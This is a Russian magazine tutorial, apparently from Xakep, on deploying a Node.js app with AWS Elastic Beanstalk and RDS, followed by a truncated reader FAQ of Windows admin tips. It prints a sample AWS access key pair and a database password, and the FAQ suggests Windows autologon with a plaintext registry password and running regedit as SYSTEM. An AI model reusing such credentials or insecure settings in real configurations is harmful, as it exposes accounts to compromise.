                     AMAZON ELASTIC
                       BEANSTALKХАЙЛОАД
БЕЗ ХЛОПОТ





                                                                               Илья Русанен
                                                                                                   rusanen@glc.ru
Ты написал свой веб-сервис. Обложил тестами, до-
фиксил баги, сделал последние предрелизные ком-
миты. Теперь нужно его где-то захостить. Конечно,
можно особо не напрягаться и выложить его на обыч-
ном хостинге или VPS. Но что, если ты, сам того
не зная, написал новый Instagram и завтра к тебе при-
дет миллион юзеров? Хорошо бы сразу настроить все
по уму: предусмотреть балансировку нагрузки, до-
ставку кода, правила масштабирования. И желатель-
но без сложностей и преждевременной оптимизации.
Займемся этим!

ЗАЧЕМ ЭТО НУЖНО: КРАТКИЙ ЛИКБЕЗ
Как известно, у платформы AWS есть множество сервисов на все случаи жизни.
Из всего многообразия сегодня нам понадобятся два наиболее популярных:
•  EC2 — система виртуальных инстансов; по своей логике похожа на Digital
   Ocean, только более гибкая;
• RDS — система виртуализации реляционных БД в AWS.

Все сервисы AWS управляются с помощью админки AWS или через API. При ра-
боте через консоль администратора алгоритм действий в нашем случае будет
таким:
•  заходим в консоль AWS;
•  выбираем нужный сервис, например EC2;
•  внутри админки EC2 создаем, скажем, два виртуальных инстанса c гигабай-
   том памяти (в реальности чуть сложнее, но об этом позже);
•  идем в админку сервиса баз данных (RDS);
•  создаем одну базу данных MySQL с гигабайтом памяти;
•  разрешаем нашим инстансам из EC2 ходить к созданной RDS.

Выглядит довольно просто, если понимаешь логику инфраструктуры AWS. Од-
нако на практике управлять всем этим вручную довольно неудобно. Процесс
осложняется, если инстансы нужно сгруппировать в балансировщик нагрузки
и включить в autoscaling-группу. Кроме того, что все это нужно просто создать
и настроить, сервисами надо как-то управлять, надо их мониторить, иметь воз-
можность быстрого масштабирования, желательно автоматического. Вот тут
и приходит на помощь Elastic Beanstalk.

ЧТО ЭТО ТАКОЕ
EBS — это надстройка-оркестратор над сервисами Amazon. Он поможет по за-
данной конфигурации быстро поднять несколько инстансов нашего приложе-
ния, базу данных, связать их с кешем, настроить балансировщик нагрузки и по-
лучить агрегированные логи. Всего несколько простых команд из CLI, и через
пару минут у нас готово продакшен-окружение и настроенное приложение, ко-
торое будет само масштабироваться в зависимости от нагрузки.
   Прелесть EBS в том, что он бесплатный. То есть за услуги оркестрации мы
не платим ничего, оплачивается только стоимость инстансов по стандартным
тарифам EC2.

ЧЕМ ЭТО ОТЛИЧАЕТСЯ ОТ DOCKER ИЛИ ОРКЕСТРАТОРОВ?
Главное отличие EBS в том, что он более высокоуровневый и заточен под ти-
повые кейсы. Если при работе с Docker тебе, скорее всего, нужно будет напи-
сать несколько докерфайлов, настроить доступы и продумать логику построе-
ния контейнеров на хосте (что не всегда так уж и просто, хотя compose сильно
облегчает задачу), то EBS берет все это на себя. Все, что нужно сделать, — это
загрузить исходный код приложения, выбрать стек технологий для нее (напри-
мер, Ruby on Rails или Node.js) и указать команду, которой твое приложение
запускается. Все остальное EBS сделает сам. К тому же в твоем распоряжении
из коробки окажется вся мощь инфраструктуры Amazon с практически неогра-
ниченными ресурсами, а значит — и возможностями масштабирования.
   Конечно, EBS с дочерними сервисами — это по логике работы такие же
контейнеры, как и Docker. Но под капотом большая разница. Docker — это на-
стоящие, честные изолированные контейнеры, которые могут располагаться
на одном хосте — инстансе виртуальной машины. При желании ты сможешь
перенести Docker-контейнеры на другой хост (с некоторым количеством те-
лодвижений). А вот EBS — это контейнеры «более низкого уровня», здесь роль
контейнера выполняет сам инстанс EC2, внутри которого может хоститься вор-
кер, веб-сервер или реляционная база данных.

ПРИСТУПАЕМ К РАБОТЕ
Процесс работы с EBS довольно прост.
1. Сначала нужно установить пакет консольных утилит для облегчения работы
   с EBS. Скачивается с сайта Amazon.
2. Далее в директории нашего приложения (репозитория) нужно инициали-
   зировать новый EBS-проект. В процессе инициализации тебе потребуется
   выбрать регион, где будет хоститься приложение (Европа, США, Ирландия),
   стек (Node/Ruby/Python/etc.), количество памяти, диска на один инстанс
   в пуле балансировщика нагрузки (тип инстанса), а также задать имена
   для окружения, в котором и будет располагаться твое приложение (напри-
   мер, myapp.dev или myapp.live), и имя самого приложения (например,
   myapp); результатом будет сгенерированный файл конфигурации, который
   появится в директории .elasticbeanstalk в корне твоего проекта.
3. После этого нужно дать команду EBS создать новое окружение и настроить
   балансировщик нагрузки.
4. Далее надо закоммитить последние изменения в репозиторий, а затем соб-
   ственно пушнуть код в EBS.
5. Через несколько секунд в созданном окружении будет запущено новое при-
   ложение, и можно будет проверять работу по URL твоего окружения.

При обновлении приложения нужно закоммитить изменения в репозиторий
приложения, после чего отправить новую версию (слепок кода после послед-
него сделанного коммита) в EBS. Через несколько секунд EBS доставит изме-
ненный код на все инстансы и перезапустит процессы твоего приложения.

Из чего состоит EBS-проект?
EBS-проект обычно состоит из двух основных компонентов:
•  директории .elasticbeanstalk, которая содержит глобальные файлы-сце-
   нарии для конфигурации проекта и окружения EB: название, типы инстан-
   сов, переменные окружения, настройки окружения;
•  директории .exbextensions, которая включает набор файлов-сценари-
   ев для конфигурации твоего инстанса. Файлы представляют собой набор
   инструкций в формате YML, которые запускаются автоматически в момент
   создания нового инстанса или обновления существующего. Порядок запу-
   ска сценариев определяется названием файлов: сначала 001_..., затем
   002_... и так далее.
Что могут содержать файлы-конфигурации в .exbextensions? Почти все. При-
веду пример задач, которые (по крайней мере у меня) обычно решаются с по-
мощью этих конфигов:
•  определение переменных окружения (см. ниже);
•  компиляция CoffeeScript в JS;
•  миграция базы данных к актуальному состоянию.

Пример такого файла конфигурации (из доков AWS, но показательный):





Каждый узел конфига включает в себя namespace и option_name. Конфиги EBS
представляют собой набор значений для предопределенных в документации
параметров. Все параметры удобно сгруппированы по неймспейсам. EBS под-
держивает следующие неймспейсы:
•  общие опции для контейнеров любых типов;
•  для Docker-контейнеров;
•  для контейнеров на Java с Tomcat;
•  для контейнеров на .NET;
•  для контейнеров на Node.js;
•  для контейнеров на PHP;
•  для контейнеров на Python;
•  для контейнеров на Ruby.

Например, для Node.js (неймспейс aws:elasticbeanstalk:container:node
js) ты можешь сконфигурировать следующие параметры:
•  NodeCommand — команда, которой будет запускаться твое Node.js-приложе-
   ние, обычно node app.js;
•  NodeVersion — версия Ноды, которую использовать для запуска прило-
   жения (нужно, если инстанс собран на базе образа, который включает не-
   сколько версий Ноды);
•  GzipCompression — использовать ли Gzip-компрессию;
•  ProxyServer — тип прокси-сервера, которым отдавать статику. Нужно, если
   ты хочешь отдавать статические файлы вроде .css или .js напрямую, с помо-
  щью nginx, не утруждая этим Node.js.

Также у Node.js есть дочерний конфигурационный неймспейс aws:elasticbe
anstalk:container:nodejs:staticfiles, единственный параметр которого
может в своем имени содержать путь, откуда прокси-серверу (nginx/Apache)
нужно будет сервить статические файлы.

Готовим приложение
Давай создадим приложение на Node.js и задеплоим его в EBS. Приведу про-
стейший пример приложения, которое на любой запрос будет отвечать текущей
датой, полученной из PostgreSQL. Сейчас и далее предполагаем, что у тебя
установлен и настроен Node.js, PostgreSQL, npm и Git.
   Инициализируем новый пакет:

$ npm init
...
$ npm install pg --save
...
$ touch app.js

Добавим в app.js следующий код:
С целью экономии места из листинга намеренно вырезаны все обработчики
ошибок. Тем не менее это вполне рабочее веб-приложение на Node.js и для на-
ших учебных целей оно подойдет.
   Теперь, когда ты запустишь скрипт командой node app.js (предполагаем,
что у тебя установлен Node и модуль pg), в ответ на http://localhost:3000 придет
что-то вроде

Fri Aug 28 2015 17:44:55 GMT+0300 (MSK)

Окей, Гугл, пришло время закоммитить наш код в репозиторий. Забегая впе-
ред, сразу скажу, что код в EBS можно доставлять двумя способами:
•  загрузить в архиве руками;
•  автоматически отправить последний слепок (коммит) в EBS.





Пример бакета с множеством версий приложения
Код будет лежать в хранилище S3 в автоматически созданном бакете (корзине)
с именем вроде elasticbeanstalk-eu-west-1-095776481970. Каждая новая
версия приложения представляет собой зазипованный срез исходного кода
по последнему коммиту репозитория. Этот zip-архив будет добавляться в нашу
«корзину» и станет актуальной версией приложения, которую и будет исполь-
зовать EBS.
Итак, создаем репозиторий:

$ git init
Initialized empty Git repository in /Users/f1nn/dev/myapp/.git/

Добавляем node_modules/ в .gitignore (ни к чему тащить в EBS модули, он сам
установит все зависимости по файлу зависимостей package.json при созда-
нии инстанса):

$ touch .gitignore
$ nano .gitignore
<добавь строку node_modules/>

Файл .gitignore должен выглядеть так:

$ cat .gitignore
node_modules/

Коммитим код в репозиторий:

$ git add .
$ git commit -a -m “[init] Initial commit”
[master (root-commit) b8cc8ef] [init] Initial commit
 3 files changed, 40 insertions(+)
 create mode 100644 .gitignore
 create mode 100644 app.js
 create mode 100644 package.json

Теперь давай разбираться с самим EBS.

Ставим EB CLI
EB CLI — это набор консольных утилит для работы с EBS. Он поддерживается
для всех основных ОС: Windows, Linux и OS X. На сегодняшний день официаль-
но Amazon предлагает только один вариант установки EBS — с помощью па-
кетного менеджера pip для Python. Однако для OS X доступна еще и формула
для Homebrew (brew install awsebcli).
   Кстати, еще полгода назад была возможность скачать исходники EBS
на Python, самостоятельно положить в нужную директорию и создать алиасы
к главному скрипту EBS. Но сейчас давай пойдем официальным путем.

$ sudo pip install awsebcli

Если ты на Windows, тебе, возможно, понадобится скачать и установить сам
Python, а также pip. Детальные инструкции для твоей ОС можно найти здесь.
  Проверяем установленную версию EB CLI:

$ eb --version
EB CLI 3.5.2 (Python 2.7.1)

Все хорошо, идем дальше.

Инициализируем EBS-проект
Перед тем как уже выложить наш проект в EBS, открой консоль EBS и посмо-
три, как выглядит админка этого сервиса.





«Чистая» админка EBS без созданных окружений и приложений

Возможно, ты обратил внимание на кнопки Create new application и фор-
му выбора платформы. Все верно, EBS предоставляет возможность быстрого
запуска тестового сервиса на базе нужной платформы с помощью GUI. К со-
жалению, такой метод не очень удобен и немного противоречит правильному
workflow при работе с EBS, поэтому мы будем делать все из консоли, чтобы
лучше понять принцип.
   Итак, переходим в директорию нашего репозитория и инициализируем но-
вый проект:

$ eb init

EBS начнет задавать вопросы о конфигурации проекта. Пройдемся быстро
по ним.

Select a default region
1) us-east-1 : US East (N. Virginia)
2) us-west-1 : US West (N. California)
3) us-west-2 : US West (Oregon)
4) eu-west-1 : EU (Ireland)
5) eu-central-1 : EU (Frankfurt)
6) ap-southeast-1 : Asia Pacific (Singapore)
7) ap-southeast-2 : Asia Pacific (Sydney)
8) ap-northeast-1 : Asia Pacific (Tokyo)
9) sa-east-1 : South America (Sao Paulo)
(default is 3):

Инстансы EBS — это на самом деле инстансы EC2. Как и любой сервис AWS,
они могут физически располагаться в одном из девяти дата-центров AWS. Вы-
бирай тот, который географически ближе к твоей аудитории, чтобы пинг был
меньше. Я обычно использую или Франкфурт, или Ирландию.

You have not yet set up your credentials or your credentials
are incorrect
You must provide your credentials.
(aws-access-id):

EBS — это сервис AWS, значит, авторизация к нему происходит на основании об-
щих механизмов, принятых в инфраструктуре AWS. Если конкретнее, ты должен со-
здать ключ и секретный ключ, у которых будут права на работу с частью сервисов,
нужной EBS. В нашем случае это EC2, LoadBalancers, S3 и управление ролями EC2.
   Долго останавливаться на этой теме не буду, разве что подчеркну, что с точ-
ки зрения безопасности правильно создать IAM-юзера, наделить его мини-
мально необходимым правами, нужными для EBS, и использовать его ключики.
Сделать это можно здесь.
   Предложим, ты создал юзера, приаттачил к нему необходимые политики
(права) и получил следующие ключи:

Access Key ID:
AKIAJ3K2BCHW2LB7UDWQ
Secret Access Key:
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

Вводи их в EBS.

Enter Application Name
(default is “myapp”):

EBS попросит ввести имя для твоего приложения. Оставляем myapp.

Application myapp has been created.
It appears you are using Node.js. Is this correct?
(y/n): y

В нашем случае EBS угадал стек технологий, на которых работает наше при-
ложение. Если по каким-то причинам этого не произошло, ответь n и выбери
нужный образ, например Ruby on Rails или Django.

Do you want to set up SSH for your instances?
(y/n): n

Мне SSH обычно не нужен, однако если тебе понадобится физически зайти
на какой-нибудь инстанс и проверить, что там творится, то в последнем во-
просе можно ответить y, предоставив EBS SSH-ключик, с которым создавать
инстанс.
   Отлично, проект создан! Убедимся в этом:

$ ls -la
total 24
drwxr-xr-x   8 f1nn  staff  272 Sep  1 15:49 .
drwxr-xr-x  12 f1nn  staff  408 Aug 31 00:38 ..
drwxr-xr-x   3 f1nn  staff  102 Sep  1 16:02 .elasticbeanstalk
drwxr-xr-x  13 f1nn  staff  442 Aug 31 00:47 .git
-rw-r--r--   1 f1nn  staff  122 Sep  1 16:03 .gitignore
-rw-r--r--   1 f1nn  staff  790 Aug 28 18:24 app.js
drwxr-xr-x   3 f1nn  staff  102 Aug 31 00:39 node_modules
-rw-r--r--   1 f1nn  staff  268 Aug 31 00:39 package.json
$ ls -la .elasticbeanstalk/
total 8
drwxr-xr-x  3 f1nn  staff  102 Sep  1 16:02 .
drwxr-xr-x  8 f1nn  staff  272 Sep  1 15:49 ..
-rw-r--r--  1 f1nn  staff  198 Sep  1 16:03 config.yml

Пока наш файл глобального конфига EBS не очень информативен. Он не со-
держит самого главного — информации об окружении, в котором будет испол-
няться наше приложение:

$ cat .elasticbeanstalk/*
branch-defaults:
  master:
    environment: null
global:
  application_name: myapp
  default_ec2_keyname: null
  default_platform: Node.js
  default_region: eu-central-1
  profile: eb-cli
  sc: git

Давай это исправим и создадим окружение:

$ eb create

Опять несколько вопросов:

Enter Environment Name
(default is myapp-dev):

Оставляй как есть — myapp-dev.

Enter DNS CNAME prefix
(default is myapp-dev):

CNAME-префикс для рабочего URL, по которому будет открываться твое при-
ложение. Что-то вроде myapp-dev.elasticbeanstalk.com. Оставляй как есть.

That cname is not available. Please choose another.
Enter DNS CNAME prefix
(default is myapp-dev):
Упс! Кто-то уже создал приложение с таким же CNAME-доменом, они уникаль-
ны для всего EBS по понятным причинам. Зададим myapp-dev-xa.

Enter DNS CNAME prefix
(default is myapp-dev): myapp-dev-xa
2.0+ Platforms require a service role. We will attempt to create
one for you. You can specify your own role using the --service-role
option.
Type “view” to see the policy, or just press ENTER to continue:
WARNING: You have uncommitted changes.
Creating application version archive “b8cc”.
Application myapp has been created.
Environment details for: myapp-dev
Application name: myapp
Region: eu-central-1
Deployed Version: b8cc
Environment ID: e-4mkjeypmmv
Platform: 64bit Amazon Linux 2015.03 v2.0.0 running Node.js
Tier: WebServer-Standard
CNAME: myapp-dev-xa.elasticbeanstalk.com
Updated: 2015-09-01 13:25:16.507000+00:00
Printing Status:
INFO: createEnvironment is starting.
INFO: Using elasticbeanstalk-eu-central-1-361536763074 as Amazon S3
storage bucket for environment data.
INFO: Environment health has transitioned to Pending. There are
no instances.
INFO: Created security group named: sg-11d85078
INFO: Created load balancer named: awseb-e-4-AWSEBLoa-5LPP1PI1P2UN
INFO: Created security group named:
      awseb-e-4mkjeypmmv-stack-AWSEBSecurityGroup-Y5ZYIWHUSVZ6
INFO: Created Auto Scaling launch configuration named: awseb-e-
      4mkjeypmmv-stack-AWSEBAutoScalingLaunchConfiguration-GQSF0EHZ5VZY
INFO: Added instance [i-08d7cdc6] to your environment.
...

Сейчас начнется долгий процесс построения рабочего окружения, в котором
будет запускаться наше приложение. В процессе создания консоль AWS пока-
жет одно созданное окружение в статусе Pending:
Созданное окружение, еще без инстансов в статусе Pending

Если ты получаешь ошибку вида:

The instance profile aws-elasticbeanstalk-ec2-role associated
with theenvironment does not exist.

это значит, что ты не приаттачил к своему IAM-юзеру права для создания EC2-ро-
лей. Подробнее читай тут.
   Если все прошло успешно, ты получишь сообщение о том, что окружение
создано:

...
INFO: Created CloudWatch alarm named:
      awseb-e-4mkjeypmmv-stack-AWSEBCloudwatchAlarmLow-1BEV2IFQKK95Y
INFO: Environment health has transitioned from Pending to Ok.
INFO: Successfully launched environment: myapp-dev

Давай наконец посмотрим на наше приложение в браузере! Пишем:

$ eb open

Открывается браузер, и мы видим...
Что-то пошло не так


Кажется, что-то задеплоилось не так — приложение не работает, а nginx отда-
ет 502. Судя по тому, что мы получаем 502 от nginx, а не простой тайм-аут, наш
первый инстанс действительно работает и его nginx пытается получить ответ
от нашего приложения. И в этот момент случается что-то нехорошее. Давай
разбираться.

Что тут могло пойти ТАК?
Конечно же, внимательный читатель заметит, что в самом начале при создании
нашего приложения мы обращались к базе данных со строкой соединения

“postgres://postgres:passwd@192.168.59.103/ts.dev”

Это работало на нашей локальной машине (192.168.59.103 — адрес моего
Docker-контейнера с PostgreSQL). Но в AWS его нет. Соответственно, наше
приложение пытается присоединиться к БД, получает NOT FOUND и отдает
ошибку! Отсюда и 502, который показывает нам nginx, — он просто не получа-
ет валидного ответа от Node.js-приложения при попытке проксировать клиент-
ский запрос.
   Для проверки нашей догадки воспользуемся встроенным механизмом полу-
чения логов инстансов. Перейди в директорию приложения и выполни команду

$ eb logs
Retrieving logs...

Ответом будет длиннющая простыня логов. Кстати, иногда получать логи из кон-
соли не очень удобно, поэтому можно зайти в опции твоего окружения и запро-
сить нужный объем через GUI:





Запрашиваем логи через GUI в настройках нашего окружения

Спасаем положение
Создаем БД
Давай создадим БД, с которой и будет работать наше приложение. Для этого
воспользуемся сервисом Amazon Relational Database Service, далее — RDS.
Переходи в админку RDS и создавай новую БД на движке PostgreSQL. Особо
долго останавливаться не буду, иначе эта статья никогда не закончится. Под-
черкну только несколько моментов.
• Читай, что предлагает тебе AWS. Например, если, не думая, оставить
  опцию «use Multi-AZ Deployment and Provisioned IOPS Storage as defaults while
  creating this instance», можно нехило удивиться счету, который выставит тебе
  AWS в конце месяца. Для нашего тестового приложения вся эта избыточная
  надежность совсем не нужна.
RDS — сервис для виртуализации реляционных БД в AWS





Выставляем опции инстанса и настройки PG
К следующему шагу нужно отнестись особенно внимательно.
• Publicly Accessible. Выставляй No, нам не нужно, чтобы всякие роботы
  стучались в нашу БД. Сами мы будем получать к ней доступ по внутреннему
  адресу через амазоновскую private network.
• VPC Security Group(s). Доступы к сервисам в AWS предоставляются на ос-
  нове так называемых Securtiy Groups. Если кратко, это набор правил для фай-
  рвола для входящего и исходящего трафика. Нам нужно запретить любой
  исходящий трафик с нашей БД, но при этом разрешить входящий трафик
  с любого инстанса из всего пула нашего балансировщика нагрузки, который
  был автоматически создан вместе с нашим окружением.

Почему это важно? Дело в том, что сейчас у нашего балансировщика нагрузки
всего один инстанс и мы можем указать его внутренний IP в качестве разре-
шенного для доступа к нашей БД (TCP 5432, 5432 — порт Постгреса). Одна-
ко, когда трафик вырастет, балансировщик нагрузки создаст еще один инстанс
и начнет распределять трафик между ними двумя, у нового инстанса уже не бу-
дет доступа к БД, так как его IP нет в списке разрешенных на файрволе БД.
  Решение проблемы — создать отдельную Security-группу для нашей БД
и указать в качестве разрешенного источника трафика не какой-то конкретный
инстанс, а сам балансировщик нагрузки (по его названию).





Создаем секьюрити-группу с нужным источником трафика
Теперь возвращаемся к созданию RDS и выбираем нужную нам секьюри-
ти-группу:





Задаем для RDS созданную секьюрити-группу

Ура, наконец-то наша RDS создана и готова к работе.





Наша созданная RDS с правильно выставленными правилами для входных соединений
Пробуем подружить окружение с нашей БД
Теперь нужно научить наше приложение коннектиться к созданной БД. Самый
простой путь — передать данные о подключении через переменные окруже-
ния, добавив их в наше окружение myapp-dev. Есть два способа сделать это:
•  добавить их через веб-конфигуратор в опциях нашего окружения, а затем
   перезапустить его;
•  добавить переменные через скрипты конфигурации в .exbextensions, за-
   коммитить изменения, а затем пушнуть обновления в EBS.





Веб-конфигуратор нашего окружения


Если использовать первый вариант, можно довольно быстро все починить, од-
нако это не наш метод :). GUI-конфигуратор, безусловно, удобен, и на самом
деле он предоставляет доступ к большинству опций, которые задаются через
переменные и неймспейсы конфигов. Однако он не дает необходимого уров-
ня автоматизации при повторном деплое приложения, так что воспользуемся
первым, чтобы лучше понять процесс.
В разделе Software Configuration можно просто добавить все нужные нам переменные окружения


Итак, для задания переменных окружения создадим в папке .ebextensions
файл 001_env.config со следующим содержимым:





Обрати внимание, что вместо реальных значений мы ставим заглушки value.
Дело в том, что файл .ebextensions/001_env.config нужно добавить в наш
репозиторий приложения. Если он будет содержать реальные пароли для до-
ступа к БД, это может оказаться небезопасно (даже если наш репозиторий
приватный). Поэтому сейчас мы добавляем заглушки, а позже через веб-кон-
фигуратор подставим реальные значения.
   Теперь необходимо научить наше приложение коннектиться к БД по предо-
ставленным ему переменным окружения. Что-то пояснять здесь смысла нет,
просто приведу код итогового приложения:





Закоммитим изменения:

$ git status
On branch master
Changes not staged for commit:
  (use “git add <file>...” to update what will be committed)
  (use “git checkout -- <file>...” to discard changes in working
  directory)
    modified:   .gitignore
    modified:   app.js
Untracked files:
  (use “git add <file>...” to include in what will be committed)
    .ebextensions/
no changes added to commit (use “git add” and/or “git commit -a”)
$ git add .
$ git commit -a -m “[fix] .ebextensions, use env vars”
[master f7a99e9] [fix] .ebextensions, use env vars
 3 files changed, 36 insertions(+), 9 deletions(-)
 create mode 100644 .ebextensions/001_env.config


Обновляем приложение
Теперь самое время запушить обновления нашего приложения в EBS:

$ eb deploy
Creating application version archive “f7a9”.
Uploading myapp/f7a9.zip to S3. This may take a while.
Upload Complete.
INFO: Environment update is starting.
INFO: Deploying new version to instance(s).
INFO: Environment health has transitioned from Ok to Info.
      Command is executing on all instances.
INFO: New application version was deployed to running EC2 instances.
INFO: Environment update completed successfully.

Как мы видим, создан новый «срез» кода с меткой «f7a9». Он и отправляет на все
инстансы приложения в нашем окружении, и через пару минут окружение будет
обновлено. По завершении обновления если мы зайдем в настройки нашего
окружения, то увидим, что наши скрипты сработали и переменные окружения
подцепились.
   Естественно, наше приложение будет по-прежнему отдавать 502, так как зна-
чения переменных дефолтные. Давай забьем настоящие. Адрес БД можно по-
лучить в свойствах БД в консоли RDS. Он будет примерно таким:

pgmyappdev.cdblqpj9xqk1.eu-central-1.rds.amazonaws.com:5432
Окружение обновилось с учетом добавленных конфигов





Добавляем «настоящие» значения в переменные окружения
После чего применим изменения, и окружение начнет пересборку.





Пересборка окружения после применения новых значений переменных окружения

Немного погодя идем по заветному URL и...





PROFIT!
ДОМАШНЕЕ ЗАДАНИЕ
Вот мы и задеплоили наше первое приложение в EBS. Со стороны процесс мо-
жет показаться довольно сложным, но, если чуть-чуть въехать в логику AWS, во
всех шагах появляется смысл. Мы не коснулись темы установки правил масшта-
бирования в зависимости от трафика / количества подключений или запуска
cron-задач на leader_only. Все это местами с трудом, но гуглится, а статья полу-
чилась и так гигантская :). Если есть вопросы по этим темам, пиши на rusanen@
glc.ru. Буду рад помочь. Удачи!
                                         Алексей Zemond
                                            Панкратов
                                            3em0nd@gmail.com

FAQ
ЕСТЬ ВОПРОСЫ — ПРИСЫЛАЙ

                    НА FAQ@REAL.XAKEP.RU
    Неожиданно понадобилось сделать автологон на винде. Все бы
Q  ничего, да комп в домене. Как быть?
    В этом нам поможет реестр! Набери regedit в окне «Выполнить» и найди
A  нужную ветку.

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

В ней ищешь нужное значение, если его нет — создаешь.

AutoAdminLogon(REG_SZ)=1
DefaultUserName(REG_SZ)= <имя_пользователя>
DefaultPassword(REG_SZ)= <пароль_пользователя>
DefaultDomainName(REG_SZ)= <домен_пользовательской_учетной_записи>

После перезапуска система загрузится под указанным пользователем.

    Как можно внести изменения в реестр от имени учетной записи
Q системы под Win 7?
    Я рекомендую обратиться к утилите PsExec из набора PsTools Марка Рус-
A  синовича. Вся задача тогда сводится к одной команде

psexec -i -s regedit

Ключ -s означает запуск от учетной записи system, а -i — интерактивный за-
пуск приложений.

    Где и как можно посмотреть в винде, когда была перезагрузка си-
Q стемы?
    Об этом нам расскажет Event Viewer или, проще говоря, логи. Вот наибо-
A  лее интересные команды событий:
•  Event id 1074 — узнать, кто перезагружал систему Server 2008;
•  Event id 6008 — нештатное выключение сервера (либо отключали элек-
   тричество, либо перезагрузили через ilo);
•  Event id 26 — сервер выключил ИБП по истечении двадцати минут;
•  Event id 1076 — выключение системы.
    Сегодня попытался скачать новое приложение из Google Play,
Q  а мне в ответ ошибка при получении данных с сервера: [RPC:S-
5:AEC-0]. Как быть?
A  Тут есть два пути. Вот первый:
1. Заходим в «Настройки -> Приложения -> Все».
2. Выполняем последовательно описанные ниже действия для «Google Play
   Маркет», Google Services Framework и «Сервисы Google Play»: останавлива-
   ем, удаляем данные, удаляем обновления.
3. Заходим в «Настройки -> Аккаунты -> Google», потом — в настройки син-
   хронизации аккаунта и снимаем галочки со всех пунктов.
4. Делаем рестарт устройства.
5. Не запуская других приложений, идем в «Настройки -> Аккаунты -> Google»
   и возвращаем галочки обратно. Есть вероятность словить ошибку синхро-
   низации, но это не беда. Не обращаем внимания на это сообщение.
6. Снова перезагружаем устройство.
7. Возможно, первый запуск обновления или процесс установки нового при-
   ложения будет долгим, дальше такого быть не должно.

   Если этот способ не помог, стоит попробовать второй вариант:
1. Удаляем аккаунт Google.
2. Очищаем данные приложения Google Services Framework.
3. Удаляем данные и кеш Google Play.
4. Перезагружаем устройство.
5. Входим в Google Play и добавляем аккаунт Google.


                                                Полезный хинтВИРТУАЛЬНЫЙ WI-FI В WINDOWS

    На ноуте Wi-Fi чудит по-страшному. Я начал курить логи, выудил
Q ошибку Microsoft Virtual WiFi Miniport Adapter. Это устройство было
остановлено, поскольку оно сообщило о возникновении неполадок (код
43). Что это такое и как с этим бороться?
    Чтобы разобраться с ошибкой, давай для начала пройдемся по теории.
A В Windows 7 появилась такая опция, как виртуальный Wi-Fi (Virtual Wi-Fi), —
программная прослойка, которая из установленной в компьютере беспрово-
дной сетевой карты делает несколько виртуальных адаптеров. Как ты знаешь,
беспроводные сети могут работать в двух режимах: это ad-hoc mode и Access
Point (AP). Использование двух режимов работы на одном физическом адапте-
ре не предусмотрено, и вот тут-то на помощь пришла виртуализация.
  В Windows 7 каждый из этих виртуальных адаптеров можно настроить для
подключения к разным беспроводным сетям. Кстати, технология Virtual Wi-Fi
включена не только в Windows 7, но и в Windows 2008 R2. Virtual Wi-Fi реали-
зована в операционной системе на уровне ядра и упрощает реализацию про-
граммной точки доступа (SoftAP). От производителей беспроводных адаптеров
при этом требуется только одно — реализовать в своих драйверах поддержку
SoftAP.
   Чтобы устранить ошибку, можно отключить указанную сеть и прекрасно жить
без нее. Для этого в консоли выполни следующую команду:

netsh wlan set hostednetwork mode=disallow

                                                                       Microsoft Virtual
                                                                   WiFi Miniport
                                                                  Adapter





    Какие решения, помимо старенького RDP, есть для администри-
Q  рования удаленных компьютеров в корпоративной сети?
    Из последних решений, с которыми я работал и мне понравилось, вспо-
A  минается SCCM. Вот как его описывает вики:
   «System Center Configuration Manager (ранее Systems Management Server,
SMS) — продукт для управления ИТ-инфраструктурой на основе Microsoft
Windows и смежных устройств. Configuration Manager предоставляет такие ос-
новные возможности: управление обновлениями, развертывание ПО и опера-
ционных систем, интеграция с NAP, инвентаризация
аппаратного и программного обеспечения, уда-
ленное управление, управление виртуализирован-
ными и мобильными системами на базе Windows».
   Это очень мощная штука, которая позволяет
подключаться к пользовательскому сеансу с за-
просом на разрешение. Это практически тот же
TeamViewer, только без муторного ввода паро-
ля. Можно удаленно узнать конфигурацию обору-  SCCM
дования, что тоже важно, особенно если физического доступа к машине нет
(скажем, компьютер в другом регионе или вообще в другой стране). Да и вы-
глядит SCCM намного приятнее того же RDP. Правда, есть минус — это нес-
кромный ценник. Хотя если рассматривать именно корпоративный сегмент, то
SCCM однозначно окупит себя и сэкономит время и нервы системному адми-
нистратору.

    Какой инструмент можешь подкинуть для выполнения статическо-
Q  го анализа различной бинарщины?
     Попробуй для этих целей воспользоваться тулзой PEframe. Написана она на
A  Python и для работы требует версию 2.6.5–2.7.x. Синтаксис довольно прост.

peframe [--option] malware.exe

Все опции подробно описаны в манах.

    Какой лайтовый детектор сканера портов можешь порекомендо-
Q  вать?
     Воспользуйся PortDog — это очень легковесный детектор, написанный на
A  Python. Работает так:

sudo python portdog.py -t 0

Этой командой мы запустим детектор на постоянный анализ портов. В случае
скана тулза будет отображать, с какого IP и какой порт сканируется.

                                                               PortDog в действии
    Не так давно столкнулся с технологиями MS, а именно SRP
Q и AppLocker. Расскажи вкратце о них.
     AppLocker и SRP — это механизмы для ограничения запуска приложений,
A  которых нет в списке доверенных. SRP — старая система ограничения
запуска приложений, работает на системах начиная с Windows XP и до 8.1
Professional. Из-за имеющихся ограничений в SRP пишутся более жесткие пра-
вила. AppLocker — система ограничения запуска приложений, которая работа-
ет только в новых корпоративных редакциях ОС: Windows 7, 8 и 8.1 Enterprise
(«Корпоративная»).
   Если в одной политике используется и AppLocker, и SRP, политика SRP не
применяется. Для работы AppLocker необходимо, чтобы была запущена служба
«Удостоверение приложения» (Application Identity, AppIDSvc), иначе будут приме-
няться правила SRP. Понять, какие ограничения применяются, можно из анализа
журналов событий Windows. К примеру, все события SRP сохраняются в журна-
ле событий Windows «Приложение», источник SoftwareRestrictionPolicies.
Все события AppLocker сохраняются в журнале событий Windows. Запреты за-
пуска — с уровнем «Ошибка», разрешения — с уровнем «Сведения».
   Технология интересна, но, как и многое, может начать страшно глючить. Вот
один пример из моей практики. Компьютер с Windows 7 Pro после добавления
в домен и применения групповых политик перестал запускать половину про-
грамм, ссылаясь на SRP. Все бы ничего — можно, к примеру, переложить их
в папки, на которые действуют исключения, и проблема решена. Но для этого
нужны права админа, которых тоже нет. И подобных артефактов порой встреча-
ется просто уйма.

Q  Стоит ли переходить на Windows 10?
     Как говорят многие айтишники, пока сервиспак не вышел, смысла на но-
A  вую ОС переходить нет. Так и здесь: поставить дома и поиграться давно
пора. А вот использовать в продакшен-среде я бы не рискнул, слишком много
там еще чего должно обкататься и пройти процесс боевого тестирования, пре-
жде чем будет готово для полноценного использования.

Q  Как можно понять, что диск начал сыпаться?
     Тут есть много способов. Первоначальный и самый простой — это на-
A  блюдение за машиной: если система глючит, тормозит, очень долго чита-
